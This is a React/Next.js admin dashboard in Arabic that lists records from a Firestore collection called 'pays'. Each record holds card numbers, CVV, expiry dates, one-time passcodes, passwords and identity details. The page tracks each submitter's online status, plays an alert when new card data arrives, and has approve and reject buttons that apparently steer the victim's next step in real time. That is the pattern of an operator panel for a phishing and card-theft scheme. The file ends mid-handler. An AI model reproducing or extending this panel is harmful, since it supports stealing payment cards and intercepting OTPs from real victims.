"use client"

import { useState, useEffect, useMemo } from "react"
import { useRouter } from "next/navigation"
import { Trash2, Users, CreditCard, UserCheck, Flag, Bell, LogOut, BarChart3, Clock, Info, Layers } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { auth } from "@/lib/firestore"
import { db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { ThemeToggle } from "@/components/theam"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import {
  Pagination,
  PaginationContent,
  PaginationEllipsis,
  PaginationItem,
  PaginationLink,
  PaginationNext,
  PaginationPrevious,
} from "@/components/ui/pagination"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"

// Flag colors for row highlighting
type FlagColor = "red" | "yellow" | "green" | null

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  createdDate: string
  bank: string
  cardStatus?: string
  ip?: string
  cvv: string
  id: string | "0"
  expiryDate: string
  notificationCount: number
  otp: string
  otp2: string
  page: string
  cardNumber: string
  country?: string
  personalInfo: {
    id?: string | "0"
    name?: string
  }
  prefix: string
  status: "pending" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  pass?: string
  year: string
  month: string
  pagename: string
  plateType: string
  allOtps?: string[] | null
  idNumber: string
  email: string
  mobile: string
  network: string
  phoneOtp: string
  cardExpiry: string
  name: string
  otpCode: string
  phone: string
  flagColor?: FlagColor
}

// Create a separate component for user status that returns both the badge and the status
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <Badge
      variant="outline"
      className={`${status === "online" ? "bg-green-100 text-green-700 dark:bg-green-900 dark:text-green-300" : "bg-red-100 text-red-700 dark:bg-red-900 dark:text-red-300"} border-0`}
    >
      <span className={`mr-1.5 h-2 w-2 rounded-full ${status === "online" ? "bg-green-500" : "bg-red-500"}`} />
      <span className="text-xs">{status === "online" ? "متصل" : "غير متصل"}</span>
    </Badge>
  )
}

// Create a hook to track online status for a specific user ID
function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false)

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      setIsOnline(data && data.state === "online")
    })

    return () => unsubscribe()
  }, [userId])

  return isOnline
}

// Flag color selector component
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2">
        <div className="flex gap-2">
          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-red-100 dark:bg-red-900 hover:bg-red-200 dark:hover:bg-red-800"
                  onClick={() => onColorChange(notificationId, "red")}
                >
                  <Flag className="h-4 w-4 text-red-500 fill-red-500" />
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أحمر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-yellow-100 dark:bg-yellow-900 hover:bg-yellow-200 dark:hover:bg-yellow-800"
                  onClick={() => onColorChange(notificationId, "yellow")}
                >
                  <Flag className="h-4 w-4 text-yellow-500 fill-yellow-500" />
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أصفر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-green-100 dark:bg-green-900 hover:bg-green-200 dark:hover:bg-green-800"
                  onClick={() => onColorChange(notificationId, "green")}
                >
                  <Flag className="h-4 w-4 text-green-500 fill-green-500" />
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أخضر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-gray-500" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  // Add a new state for the filter type
  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")

  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(10)

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  // Effect to track online status for all notifications
  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {}

    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`)

      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })

      statusRefs[notification.id] = callback
    })

    // Cleanup function
    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe()
        }
      })
    }
  }, [notifications])

  // Filter notifications based on the selected filter type
  const filteredNotifications = useMemo(() => {
    if (filterType === "all") {
      return notifications
    } else if (filterType === "card") {
      return notifications.filter((notification) => notification.cardNumber)
    } else if (filterType === "online") {
      return notifications.filter((notification) => onlineStatuses[notification.id])
    }
    return notifications
  }, [filterType, notifications, onlineStatuses])

  // Calculate pagination
  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    const endIndex = startIndex + itemsPerPage
    return filteredNotifications.slice(startIndex, endIndex)
  }, [filteredNotifications, currentPage, itemsPerPage])

  // Calculate total pages
  const totalPages = useMemo(() => {
    return Math.ceil(filteredNotifications.length / itemsPerPage)
  }, [filteredNotifications, itemsPerPage])

  // Add this function to handle page changes
  const handlePageChange = (page: number) => {
    if (page < 1 || page > totalPages) return
    setCurrentPage(page)
  }

  // Add this function to handle items per page changes
  const handleItemsPerPageChange = (value: string) => {
    setItemsPerPage(Number.parseInt(value))
    setCurrentPage(1) // Reset to first page when changing items per page
  }

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.email || notification.mobile) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
        )

        // Only play notification sound if new card info or general info is added
        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound()
        }

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
    } catch (error) {
      console.error("Error hiding all notifications:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
    } catch (error) {
      console.error("Error hiding notification:", error)
    }
  }

  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id)
    await updateDoc(targetPost, {
      status: state,
    })
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  // Handle flag color change
  const handleFlagColorChange = async (id: string, color: FlagColor) => {
    try {
      // Update in Firestore
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, flagColor: color } : notification,
        ),
      )
    } catch (error) {
      console.error("Error updating flag color:", error)
    }
  }

  // Get row background color based on flag color
  const getRowBackgroundColor = (flagColor: FlagColor) => {
    if (!flagColor) return ""

    const colorMap = {
      red: "bg-red-50 dark:bg-red-950/30 hover:bg-red-100 dark:hover:bg-red-950/50",
      yellow: "bg-yellow-50 dark:bg-yellow-950/30 hover:bg-yellow-100 dark:hover:bg-yellow-950/50",
      green: "bg-green-50 dark:bg-green-950/30 hover:bg-green-100 dark:hover:bg-green-950/50",
    }

    return colorMap[flagColor]
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  // Calculate counts for filter buttons
  const cardCount = notifications.filter((n) => n.cardNumber).length
  const onlineCount = Object.values(onlineStatuses).filter(Boolean).length

  return (
    <div dir="rtl" className="min-h-screen bg-background text-foreground">
      <div className="flex flex-col h-screen">
        {/* Header */}
        <header className="border-b border-border bg-card shadow-sm">
          <div className="container mx-auto px-4 py-3 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Bell className="h-6 w-6 text-primary" />
              <h1 className="text-xl font-bold">لوحة الإشعارات</h1>
            </div>
            <div className="flex items-center gap-2">
              <ThemeToggle />
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button variant="outline" size="icon" onClick={handleLogout}>
                      <LogOut className="h-4 w-4" />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تسجيل الخروج</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
            </div>
          </div>
        </header>

        <div className="flex-1 container mx-auto px-4 py-6 overflow-hidden flex flex-col">
          {/* Statistics Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6">
            {/* Online Users Card */}
            <Card className="bg-card shadow-sm">
              <CardContent className="p-6 flex items-center">
                <div className="rounded-full bg-blue-100 dark:bg-blue-900 p-3 mr-4">
                  <UserCheck className="h-6 w-6 text-blue-600 dark:text-blue-300" />
                </div>
                <div>
                  <p className="text-sm text-muted-foreground">المستخدمين المتصلين</p>
                  <p className="text-2xl font-bold">{onlineUsersCount}</p>
                </div>
              </CardContent>
            </Card>

            {/* Total Visitors Card */}
            <Card className="bg-card shadow-sm">
              <CardContent className="p-6 flex items-center">
                <div className="rounded-full bg-green-100 dark:bg-green-900 p-3 mr-4">
                  <Users className="h-6 w-6 text-green-600 dark:text-green-300" />
                </div>
                <div>
                  <p className="text-sm text-muted-foreground">إجمالي الزوار</p>
                  <p className="text-2xl font-bold">{totalVisitors}</p>
                </div>
              </CardContent>
            </Card>

            {/* Card Submissions Card */}
            <Card className="bg-card shadow-sm">
              <CardContent className="p-6 flex items-center">
                <div className="rounded-full bg-purple-100 dark:bg-purple-900 p-3 mr-4">
                  <CreditCard className="h-6 w-6 text-purple-600 dark:text-purple-300" />
                </div>
                <div>
                  <p className="text-sm text-muted-foreground">معلومات البطاقات المقدمة</p>
                  <p className="text-2xl font-bold">{cardSubmissions}</p>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Main Content */}
          <Card className="flex-1 overflow-hidden shadow-sm">
            <CardHeader className="px-6 py-4 border-b border-border bg-muted/40">
              <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
                <div className="flex items-center gap-2">
                  <BarChart3 className="h-5 w-5 text-primary" />
                  <CardTitle className="text-lg">الإشعارات والبيانات</CardTitle>
                </div>
                <div className="flex flex-wrap gap-2">
                  <Button
                    variant="destructive"
                    onClick={handleClearAll}
                    disabled={notifications.length === 0}
                    className="flex items-center gap-2"
                    size="sm"
                  >
                    <Trash2 className="h-4 w-4" />
                    مسح الكل
                  </Button>
                </div>
              </div>
            </CardHeader>

            <Tabs defaultValue="all" className="w-full">
              <div className="px-6 pt-4 border-b border-border">
                <TabsList className="grid grid-cols-3 w-full max-w-md">
                  <TabsTrigger value="all" onClick={() => setFilterType("all")}>
                    <Layers className="h-4 w-4 mr-2" />
                    الكل ({notifications.length})
                  </TabsTrigger>
                  <TabsTrigger value="card" onClick={() => setFilterType("card")}>
                    <CreditCard className="h-4 w-4 mr-2" />
                    البطاقات ({cardCount})
                  </TabsTrigger>
                  <TabsTrigger value="online" onClick={() => setFilterType("online")}>
                    <UserCheck className="h-4 w-4 mr-2" />
                    المتصلين ({onlineCount})
                  </TabsTrigger>
                </TabsList>
              </div>

              <TabsContent value="all" className="m-0">
                <ScrollArea className="h-[calc(100vh-22rem)]">
                  {/* Desktop Table View - Hidden on Mobile */}
                  <div className="hidden md:block">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-border bg-muted/30">
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة</th>
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">المعلومات</th>
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">OTP</th>
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
                          <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
                          <th className="px-4 py-3 text-center font-medium text-muted-foreground">العلم</th>
                          <th className="px-4 py-3 text-center font-medium text-muted-foreground">الإجراءات</th>
                        </tr>
                      </thead>
                      <tbody>
                        {paginatedNotifications.map((notification) => (
                          <tr
                            key={notification.id}
                            className={`border-b border-border ${getRowBackgroundColor(notification?.flagColor!)} transition-colors`}
                          >
                            <td className="px-4 py-3">{notification.country || "غير معروف"}</td>
                            <td className="px-4 py-3">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 hover:bg-green-600 dark:bg-green-600 dark:hover:bg-green-700" : ""}`}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>
                            </td>
                            <td className="px-4 py-3">
                              {notification?.otp ? (
                                <Badge
                                  variant="outline"
                                  className="bg-blue-100 text-blue-700 dark:bg-blue-900 dark:text-blue-300 border-0"
                                >
                                  {notification.otp}
                                </Badge>
                              ) : (
                                "-"
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap">
                              <div className="flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="text-sm">
                                  {notification.createdDate &&
                                    formatDistanceToNow(new Date(notification.createdDate), {
                                      addSuffix: true,
                                      locale: ar,
                                    })}
                                </span>
                              </div>
                            </td>
                            <td className="px-4 py-3 text-center">
                              <UserStatus userId={notification.id} />
                            </td>
                            <td className="px-4 py-3 text-center">
                              <FlagColorSelector
                                notificationId={notification.id}
                                currentColor={notification.flagColor || null}
                                onColorChange={handleFlagColorChange}
                              />
                            </td>
                            <td className="px-4 py-3 text-center">
                              <div className="flex justify-center gap-2">
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-green-500 dark:bg-green-600 text-white hover:bg-green-600 dark:hover:bg-green-700"
                                >
                                  قبول
                                </Button>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-red-500 dark:bg-red-600 text-white hover:bg-red-600 dark:hover:bg-red-700"
                                >
                                  رفض
                                </Button>
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button
                                        variant="ghost"
                                        size="icon"
                                        onClick={() => handleDelete(notification.id)}
                                        className="h-8 w-8 text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300 hover:bg-red-100 dark:hover:bg-red-900/30"
                                      >
                                        <Trash2 className="h-4 w-4" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent>
                                      <p>حذف الإشعار</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              </div>
                            </td>
                          </tr>
                        ))}
                        {paginatedNotifications.length === 0 && (
                          <tr>
                            <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
                              لا توجد إشعارات متطابقة مع الفلتر المحدد
                            </td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>

                  {/* Mobile Card View - Shown only on Mobile */}
                  <div className="md:hidden space-y-4 p-4">
                    {paginatedNotifications.length > 0 ? (
                      paginatedNotifications.map((notification) => (
                        <Card
                          key={notification.id}
                          className={`overflow-hidden bg-card border-border ${getRowBackgroundColor(notification?.flagColor!)}`}
                        >
                          <CardContent className="p-4">
                            <div className="flex justify-between items-start mb-3">
                              <div>
                                <div className="font-semibold">{notification.country || "غير معروف"}</div>
                              </div>
                              <div className="flex items-center gap-2">
                                <FlagColorSelector
                                  notificationId={notification.id}
                                  currentColor={notification.flagColor || null}
                                  onColorChange={handleFlagColorChange}
                                />
                                <UserStatus userId={notification.id} />
                              </div>
                            </div>

                            <div className="grid grid-cols-1 gap-3 mb-3">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 dark:bg-green-600" : ""}`}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>

                              <div className="text-sm flex items-center">
                                <span className="font-medium ml-2">رمز التحقق:</span>
                                {notification?.otp ? (
                                  <Badge
                                    variant="outline"
                                    className="bg-blue-100 text-blue-700 dark:bg-blue-900 dark:text-blue-300 border-0"
                                  >
                                    {notification.otp}
                                  </Badge>
                                ) : (
                                  "-"
                                )}
                              </div>

                              <div className="text-sm flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="font-medium ml-2">الوقت:</span>{" "}
                                {notification.createdDate &&
                                  formatDistanceToNow(new Date(notification.createdDate), {
                                    addSuffix: true,
                                    locale: ar,
                                  })}
                              </div>

                              <div className="flex gap-2 mt-2">
                                <Button
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1 bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700"
                                  size="sm"
                                >
                                  قبول
                                </Button>
                                <Button
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1"
                                  variant="destructive"
                                  size="sm"
                                >
                                  رفض
                                </Button>
                                <Button
                                  variant="outline"
                                  onClick={() => handleDelete(notification.id)}
                                  className="w-10 p-0"
                                  size="sm"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </div>
                              {message && (
                                <p className="text-green-500 dark:text-green-400 text-center mt-2">تم الارسال</p>
                              )}
                            </div>
                          </CardContent>
                        </Card>
                      ))
                    ) : (
                      <div className="text-center py-8 text-muted-foreground">
                        لا توجد إشعارات متطابقة مع الفلتر المحدد
                      </div>
                    )}
                  </div>

                  {/* Pagination Controls */}
                  {filteredNotifications.length > 0 && (
                    <div className="mt-4 px-4 pb-4">
                      <div className="flex flex-col sm:flex-row justify-between items-center gap-4">
                        <div className="text-sm text-muted-foreground">
                          عرض {(currentPage - 1) * itemsPerPage + 1} إلى{" "}
                          {Math.min(currentPage * itemsPerPage, filteredNotifications.length)} من{" "}
                          {filteredNotifications.length} إشعار
                        </div>

                        <div className="flex items-center gap-4">
                          <div className="flex items-center gap-2">
                            <span className="text-sm text-muted-foreground">عدد العناصر:</span>
                            <Select value={itemsPerPage.toString()} onValueChange={handleItemsPerPageChange}>
                              <SelectTrigger className="w-[80px]">
                                <SelectValue placeholder="10" />
                              </SelectTrigger>
                              <SelectContent>
                                <SelectItem value="5">5</SelectItem>
                                <SelectItem value="10">10</SelectItem>
                                <SelectItem value="20">20</SelectItem>
                                <SelectItem value="50">50</SelectItem>
                              </SelectContent>
                            </Select>
                          </div>

                          <Pagination>
                            <PaginationContent>
                              <PaginationItem>
                                <PaginationPrevious
                                  onClick={() => handlePageChange(currentPage - 1)}
                                  className={currentPage === 1 ? "pointer-events-none opacity-50" : "cursor-pointer"}
                                />
                              </PaginationItem>

                              {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                                let pageNumber: number

                                if (totalPages <= 5) {
                                  // If 5 or fewer pages, show all page numbers
                                  pageNumber = i + 1
                                } else if (currentPage <= 3) {
                                  // If on pages 1-3, show pages 1-5
                                  pageNumber = i + 1
                                } else if (currentPage >= totalPages - 2) {
                                  // If on last 3 pages, show last 5 pages
                                  pageNumber = totalPages - 4 + i
                                } else {
                                  // Otherwise show current page and 2 pages on each side
                                  pageNumber = currentPage - 2 + i
                                }

                                return (
                                  <PaginationItem key={pageNumber}>
                                    <PaginationLink
                                      onClick={() => handlePageChange(pageNumber)}
                                      isActive={currentPage === pageNumber}
                                    >
                                      {pageNumber}
                                    </PaginationLink>
                                  </PaginationItem>
                                )
                              })}

                              {totalPages > 5 && currentPage < totalPages - 2 && (
                                <>
                                  <PaginationItem>
                                    <PaginationEllipsis />
                                  </PaginationItem>
                                  <PaginationItem>
                                    <PaginationLink onClick={() => handlePageChange(totalPages)}>
                                      {totalPages}
                                    </PaginationLink>
                                  </PaginationItem>
                                </>
                              )}

                              <PaginationItem>
                                <PaginationNext
                                  onClick={() => handlePageChange(currentPage + 1)}
                                  className={
                                    currentPage === totalPages ? "pointer-events-none opacity-50" : "cursor-pointer"
                                  }
                                />
                              </PaginationItem>
                            </PaginationContent>
                          </Pagination>
                        </div>
                      </div>
                    </div>
                  )}
                </ScrollArea>
              </TabsContent>

              <TabsContent value="card" className="m-0">
                <ScrollArea className="h-[calc(100vh-22rem)]">
                  {/* Same structure as "all" tab but with card filtered data */}
                  <div className="hidden md:block">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-border bg-muted/30">
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة</th>
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">المعلومات</th>
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">OTP</th>
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
                          <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
                          <th className="px-4 py-3 text-center font-medium text-muted-foreground">العلم</th>
                          <th className="px-4 py-3 text-center font-medium text-muted-foreground">الإجراءات</th>
                        </tr>
                      </thead>
                      <tbody>
                        {paginatedNotifications.map((notification) => (
                          <tr
                            key={notification.id}
                            className={`border-b border-border ${getRowBackgroundColor(notification?.flagColor!)} transition-colors`}
                          >
                            <td className="px-4 py-3">{notification.country || "غير معروف"}</td>
                            <td className="px-4 py-3">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 hover:bg-green-600 dark:bg-green-600 dark:hover:bg-green-700" : ""}`}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>
                            </td>
                            <td className="px-4 py-3">
                              {notification?.otp ? (
                                <Badge
                                  variant="outline"
                                  className="bg-blue-100 text-blue-700 dark:bg-blue-900 dark:text-blue-300 border-0"
                                >
                                  {notification.otp}
                                </Badge>
                              ) : (
                                "-"
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap">
                              <div className="flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="text-sm">
                                  {notification.createdDate &&
                                    formatDistanceToNow(new Date(notification.createdDate), {
                                      addSuffix: true,
                                      locale: ar,
                                    })}
                                </span>
                              </div>
                            </td>
                            <td className="px-4 py-3 text-center">
                              <UserStatus userId={notification.id} />
                            </td>
                            <td className="px-4 py-3 text-center">
                              <FlagColorSelector
                                notificationId={notification.id}
                                currentColor={notification.flagColor || null}
                                onColorChange={handleFlagColorChange}
                              />
                            </td>
                            <td className="px-4 py-3 text-center">
                              <div className="flex justify-center gap-2">
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-green-500 dark:bg-green-600 text-white hover:bg-green-600 dark:hover:bg-green-700"
                                >
                                  قبول
                                </Button>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
